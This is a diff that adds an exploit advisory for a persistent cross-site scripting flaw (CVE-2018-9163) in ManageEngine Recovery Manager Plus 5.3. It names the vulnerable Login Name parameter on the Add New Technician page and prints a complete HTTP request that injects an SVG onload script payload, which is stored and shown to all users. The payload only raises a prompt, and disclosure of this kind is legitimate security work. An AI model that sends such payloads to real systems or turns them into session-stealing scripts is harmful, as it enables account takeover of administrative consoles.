@@ -1,0 +1,35 @@
+# Exploit Title: ManageEngine Recovery Manager Plus 5.3 (Build 5330) - Persistent Cross-Site Scripting
+# Dated: 2018-03-31
+# Exploit Author: Ahmet GÜREL
+# Software Link: https://www.manageengine.com/ad-recovery-manager/
+# Version: < = 5.3 (Build 5330)
+# Platform: Java
+# Tested on: Windows
+# CVE: CVE-2018-9163
+
+# 1. DETAILS
+# In the Add New Technician (s) section on the /admin/technicians page of the
+# ManageEngine Recovery Manager Plus 5.3 (Build 5330) application, allows
+# remote authenticated users with the Login Name parameter is vulnerable to
+# XSS. The parameters entered are written in the database and affect all
+# users.
+
+# 2. PoC:
+# From the Add New Technician (s) page, it is possible to inject malicious
+# web code inside Login Name parameter. The HTTP request looks like the following:
+
+GET
+/technicianAction.do?req={%22domainId%22:0,%22loginName%22:%22%3Csvg%20onload%3Dprompt(document.domain)%3E%22,%22password%22:%22Test123%22,%22isDomainUser%22:false,%22roleId%22:1,%22operation%22:%22createTechnicians%22}
+HTTP/1.1
+Host: 172.16.219.168:8090
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:59.0)
+Gecko/20100101 Firefox/59.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://172.16.219.168:8090/
+Content-Type: application/json; charset=utf-8
+X-Requested-With: XMLHttpRequest
+Cookie: JSESSIONIDRMP=64556C394C0687AA34179CFE2EF4EA5A;
+JSESSIONIDSSO=0605E8EB825B181A4A201542A518457D
+Connection: close
